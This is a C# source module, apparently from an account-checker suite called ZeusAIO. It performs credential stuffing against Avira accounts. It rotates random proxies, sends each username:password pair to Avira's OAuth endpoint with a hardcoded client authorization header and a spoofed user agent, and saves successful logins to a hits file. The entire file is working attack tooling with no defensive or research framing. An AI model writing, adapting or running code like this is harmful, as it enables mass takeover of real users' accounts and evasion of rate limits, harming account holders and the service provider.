using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace Avira
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.AllowAutoRedirect = false;
                            httpRequest.AddHeader("Authorization", "Basic YXZpcmEvZGFzaGJvYXJkOjAyMjI4OWNjOTZhMTQwOTI4YWQ5ODNjNTJmYTRjYTNlMDZmODBkZDg5NjgwNGE0YmIxNDFkMDc2MjY2YTQ0OTA=");
                            httpRequest.AddHeader("Origin", "https://my.avira.com");
                            string str = "{\"grant_type\":\"password\",\"username\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\"}";
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string strResponse = httpRequest.Post("https://api.my.avira.com/v2/oauth/", str, "application/json").ToString();
                            {
                                if (strResponse.Contains("invalid_credentials"))
                                {
                                    //bads
                                    break;
                                }
                                else if (strResponse.Contains("device_token")) //hit
                                {
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui== "2")
                                    {
                                        Console.WriteLine("[HIT - AVIRA] " + s[0] + ":" + s[1], Color.Green);
                                    }
                                    Export.AsResult("/Avira_hits", s[0] + ":" + s[1]);
                                    return false;


                                }
                                else
                                {
                                    ZeusAIO.mainmenu.realretries++;
                                    goto Retry;
                                }
                            }
                            break;
                        }
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
  
    }
}
